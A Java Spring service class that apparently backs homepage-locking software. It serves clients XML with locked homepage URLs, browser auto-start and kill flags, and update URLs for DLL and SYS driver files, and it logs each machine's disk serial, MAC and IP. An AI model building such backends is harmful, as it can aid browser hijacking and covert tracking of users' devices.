package com.sltunion.cloudy.service.impl;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import javax.annotation.Resource;

import org.springframework.dao.DuplicateKeyException;
import org.springframework.stereotype.Service;

import com.sltunion.cloudy.common.utils.DateUtil;
import com.sltunion.cloudy.common.utils.LogerUtil;
import com.sltunion.cloudy.common.utils.ObjectUtil;
import com.sltunion.cloudy.common.utils.XmlParseUtil;
import com.sltunion.cloudy.persistent.mapper.TDriverMapper;
import com.sltunion.cloudy.persistent.mapper.TDriverdownlogMapper;
import com.sltunion.cloudy.persistent.mapper.THomepagelockMapper;
import com.sltunion.cloudy.persistent.mapper.THomepagelocklogMapper;
import com.sltunion.cloudy.persistent.model.TDriver;
import com.sltunion.cloudy.persistent.model.TDriverdownlog;
import com.sltunion.cloudy.persistent.model.THomepagelock;
import com.sltunion.cloudy.persistent.model.THomepagelocklog;
import com.sltunion.cloudy.service.DriverDownService;
import com.sltunion.cloudy.vo.xml.DriverInfoXml;

@Service("driverDownService")
public class DriverDownServiceImpl implements DriverDownService {

	@Resource
	private TDriverdownlogMapper tDriverdownMapper;
	@Resource
	private THomepagelockMapper tHomepagelockMapper;
	@Resource
	private THomepagelocklogMapper tHomepagelocklogMapper;
	@Resource
	private TDriverMapper tDriverMapper;

	public String pullMultiXml(Long channelid, String dn, String ma, String ip, Integer i3,
			String db, String id, String sn, Integer sv, String debug) {
		String createdate = DateUtil.getDateStr();
		String createtime = DateUtil.getDatetime();
		int hour = DateUtil.getHour();
		long homepageid = 1;
		DriverInfoXml driverInfoXml = new DriverInfoXml();
		try {
			THomepagelock tHomepagelock = pullTHomepagelockByChannelid(channelid);
			if (tHomepagelock != null) {
				String url360chrome = tHomepagelock.getUrl360chrome();
				String url360se = tHomepagelock.getUrl360se();
				homepageid = tHomepagelock.getId();

				// 驱动加载记录入库
				if (ObjectUtil.isNotEmpty(dn)) {
					addTHomepagelocklog(channelid, homepageid, dn, ma, ip, i3, db, sv, hour,
							createdate, createtime);
				}

				int autoStartIe = tHomepagelock.getAutoie();
				int prtMe = tHomepagelock.getFkill();

				int status = 0;
				if (tHomepagelock.getStatus() != null) {
					status = tHomepagelock.getStatus().intValue();

					if (status == 1) {
						List<String> urlEntry = new ArrayList<String>();
						urlEntry.add(tHomepagelock.getUrl());
						if (ObjectUtil.isNotEmpty(url360se)) {
							urlEntry.add(url360se);
						}
						if (ObjectUtil.isNotEmpty(url360chrome)) {
							urlEntry.add(url360chrome);
						}

						driverInfoXml.setUrlCount(urlEntry.size());
						driverInfoXml.setUrlEntry(urlEntry);
					}
				}
				driverInfoXml.setLockFlag(status);
				driverInfoXml.setAutoStartIe(autoStartIe);
				driverInfoXml.setPrtMe(prtMe);

				try {
					TDriver tDriver = findDriver(channelid, debug);
					if (ObjectUtil.isNotEmpty(tDriver)) {
						String version = tDriver.getVersion().toString();
						String host = tDriver.getUpdatehost();
						String ip1 = tDriver.getUpdateip();
						String ip2 = tDriver.getUpdateip2();
						int port = tDriver.getUpdateport();
						String dllStr = tDriver.getDllurl();
						String sysStr = tDriver.getSysurl();
						int updateCount = 0;

						if (ObjectUtil.isNotEmpty(dllStr)) {
							driverInfoXml.setD_dn_rl(dllStr);
							updateCount++;
						} else {
							driverInfoXml.setD_dn_rl("");
						}

						if (ObjectUtil.isNotEmpty(sysStr)) {
							driverInfoXml.setS_dn_rl(sysStr);
							updateCount++;
						} else {
							driverInfoXml.setS_dn_rl("");
						}

						driverInfoXml.setSysVersion(version);
						driverInfoXml.setUpdateHost(host);
						driverInfoXml.setUpdateIp(ip1);
						driverInfoXml.setUpdateIp2(ip2);
						driverInfoXml.setUpdatePort(port);
						driverInfoXml.setUpdateCount(updateCount);
					} else {
						setErrorUpdateXml(driverInfoXml);
					}
				} catch (Exception e) {
					LogerUtil.logger.error("", e);
					setErrorUpdateXml(driverInfoXml);
				}
			} else {
				setErrorLockXml(driverInfoXml);
				setErrorUpdateXml(driverInfoXml);
			}
		} catch (Exception e) {
			LogerUtil.logger.error("", e);
			setErrorLockXml(driverInfoXml);
			setErrorUpdateXml(driverInfoXml);
		}

		String url = XmlParseUtil.marshal(driverInfoXml, DriverInfoXml.class);
		return url;
	}

	/**
	 * 驱动下载
	 */
	public String pullDriver(Long channelid, String dn, String ma, String ip, Integer i3,
			String db, String id, String sn, Integer sv, String debug) {
		String createdate = DateUtil.getDateStr();
		String createtime = DateUtil.getDatetime();
		int hour = DateUtil.getHour();
		DriverInfoXml driverInfoXml = new DriverInfoXml();
		setErrorLockXml(driverInfoXml);
		try {
			TDriver tDriver = findDriver(channelid, debug);
			if (ObjectUtil.isNotEmpty(tDriver)) {
				String version = tDriver.getVersion().toString();
				String host = tDriver.getUpdatehost();
				String ip1 = tDriver.getUpdateip();
				String ip2 = tDriver.getUpdateip2();
				int port = tDriver.getUpdateport();
				String dllStr = tDriver.getDllurl();
				String sysStr = tDriver.getSysurl();
				int updateCount = 0;

				if (ObjectUtil.isNotEmpty(dllStr)) {
					driverInfoXml.setD_dn_rl(dllStr);
					updateCount++;
				} else {
					driverInfoXml.setD_dn_rl("");
				}

				if (ObjectUtil.isNotEmpty(sysStr)) {
					driverInfoXml.setS_dn_rl(sysStr);
					updateCount++;
				} else {
					driverInfoXml.setS_dn_rl("");
				}

				driverInfoXml.setSysVersion(version);
				driverInfoXml.setUpdateHost(host);
				driverInfoXml.setUpdateIp(ip1);
				driverInfoXml.setUpdateIp2(ip2);
				driverInfoXml.setUpdatePort(port);
				driverInfoXml.setUpdateCount(updateCount);

				try {
					if (ObjectUtil.isNotEmpty(dn)) {
						addTDriverdown(channelid, dn, ma, ip, hour, createdate, createtime);
					}
				} catch (DuplicateKeyException e) {
					LogerUtil.logger.error("", e);
				}
			} else {
				setErrorUpdateXml(driverInfoXml);
			}
		} catch (Exception e) {
			LogerUtil.logger.error("", e);
			setErrorUpdateXml(driverInfoXml);
		}
		String url = XmlParseUtil.marshal(driverInfoXml, DriverInfoXml.class);
		return url;
	}
	
	/**
	 * 文件下载
	 */
	public int pullDown(Long channelid, String dn, String ma, String ip, String debug) {
		String createdate = DateUtil.getDateStr();
		String createtime = DateUtil.getDatetime();
		int hour = DateUtil.getHour();
		int result = 0;
		try {
			if (ObjectUtil.isNotEmpty(dn)) {
				result = addTDriverdown(channelid, dn, ma, ip, hour, createdate, createtime);
			}
		} catch (Exception e) {
			LogerUtil.logger.error("", e);
		}
		return result;
	}

	protected void setErrorUpdateXml(DriverInfoXml driverInfoXml) {
		driverInfoXml.setSysVersion("0");
		driverInfoXml.setUpdateHost("");
		driverInfoXml.setUpdateIp("");
		driverInfoXml.setUpdateIp2("");
		driverInfoXml.setUpdatePort(0);
		driverInfoXml.setD_dn_rl("");
		driverInfoXml.setS_dn_rl("");
		driverInfoXml.setUpdateCount(0);
	}

	protected void setErrorLockXml(DriverInfoXml driverInfoXml) {
		driverInfoXml.setLockFlag(0);
		driverInfoXml.setUrlCount(0);
		driverInfoXml.setAutoStartIe(0);
		driverInfoXml.setPrtMe(0);
	}

	protected THomepagelock pullTHomepagelockByChannelid(Long channelid) {
		Map<String, Object> param = new HashMap<String, Object>();
		param.put("channelid", channelid);
		THomepagelock tHomepagelock = tHomepagelockMapper.selectByPull(param);
		if (tHomepagelock == null) {
			param.put("channelid", 1);
			tHomepagelock = tHomepagelockMapper.selectByPull(param);
		}
		return tHomepagelock;
	}

	protected TDriver findDriver(Long channelid, String debug) {
		Integer status = 1;
		if ("true".equalsIgnoreCase(debug)) {
			status = 0;
		}
		Map<String, Object> param = new HashMap<String, Object>();
		param.put("channelid", channelid);
		param.put("status", status);
		return tDriverMapper.selectByPull(param);
	}

	protected String createtUseragent(Integer sv) {
		String useragent = "";
		if (ObjectUtil.isNotEmpty(sv)) {
			switch (sv.intValue()) {
			case 51: {
				useragent += "Windows NT 5.1;";
				break;
			}
			case 52: {
				useragent += "Windows NT 5.2;";
				break;
			}
			case 60: {
				useragent += "Windows NT 6.0;";
				break;
			}
			case 61: {
				useragent += "Windows NT 6.1;";
				break;
			}
			case 62: {
				useragent += "Windows NT 6.2;";
				break;
			}
			default:
				useragent += "Windows NT;";
				break;
			}
		}
		return useragent;
	}

	protected void addTHomepagelocklog(Long channelid, Long homepageid, String disknum, String mac,
			String ip, Integer is360, String defaultbrowser, Integer sv, Integer hour,
			String createdate, String createtime) {

		String useragent = createtUseragent(sv);

		THomepagelocklog tHomepagelocklog = new THomepagelocklog();
		tHomepagelocklog.setChannelid(channelid);
		tHomepagelocklog.setHomepageid(homepageid);
		tHomepagelocklog.setDisknum(disknum);
		tHomepagelocklog.setMac(mac);
		tHomepagelocklog.setIp(ip);
		tHomepagelocklog.setUseragent(useragent);
		tHomepagelocklog.setIs360(is360.byteValue());
		tHomepagelocklog.setDefaultbrowser(defaultbrowser);
		tHomepagelocklog.setHour(hour);
		tHomepagelocklog.setCreatedate(createdate);
		tHomepagelocklog.setCreatetime(createtime);

		try {
			tHomepagelocklogMapper.insertSelective(tHomepagelocklog);
		} catch (DuplicateKeyException e) {
			LogerUtil.logger.error(e.getMessage());
		}
	}

	public int addTDriverdown(Long channelid, String disknum, String mac, String ip, Integer hour,
			String createdate, String createtime) {
		TDriverdownlog tDriverdown = new TDriverdownlog();
		tDriverdown.setChannelid(channelid);
		tDriverdown.setDisknum(disknum);
		tDriverdown.setMac(mac);
		tDriverdown.setIp(ip);
		tDriverdown.setHour(hour);
		tDriverdown.setCreatedate(createdate);
		tDriverdown.setCreatetime(createtime);
		return tDriverdownMapper.insertSelective(tDriverdown);
	}
}
